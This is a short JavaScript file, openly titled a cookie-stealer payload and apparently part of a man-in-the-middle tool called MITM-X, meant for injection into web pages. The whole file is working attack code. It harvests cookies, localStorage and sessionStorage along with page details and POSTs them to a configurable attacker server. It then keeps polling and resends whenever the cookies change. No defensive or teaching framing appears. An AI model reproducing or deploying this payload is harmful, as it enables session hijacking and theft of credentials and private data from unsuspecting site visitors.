// Cookie Stealer Payload - Steals cookies and session data
(function(){
    var attackerServer = 'http://192.168.1.100:8080'; // Change to your server
    
    function stealCookies() {
        var cookies = document.cookie;
        var localStorage = {};
        var sessionStorage = {};
        
        // Get localStorage data
        try {
            for (var i = 0; i < window.localStorage.length; i++) {
                var key = window.localStorage.key(i);
                localStorage[key] = window.localStorage.getItem(key);
            }
        } catch(e) {}
        
        // Get sessionStorage data
        try {
            for (var i = 0; i < window.sessionStorage.length; i++) {
                var key = window.sessionStorage.key(i);
                sessionStorage[key] = window.sessionStorage.getItem(key);
            }
        } catch(e) {}
        
        var payload = {
            url: window.location.href,
            cookies: cookies,
            localStorage: localStorage,
            sessionStorage: sessionStorage,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            referrer: document.referrer
        };
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', attackerServer + '/cookies', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(payload));
    }
    
    // Steal cookies immediately
    stealCookies();
    
    // Monitor for new cookies
    var originalCookie = document.cookie;
    setInterval(function() {
        if (document.cookie !== originalCookie) {
            stealCookies();
            originalCookie = document.cookie;
        }
    }, 5000);
    
    console.log('MITM-X Cookie stealer active');
})();
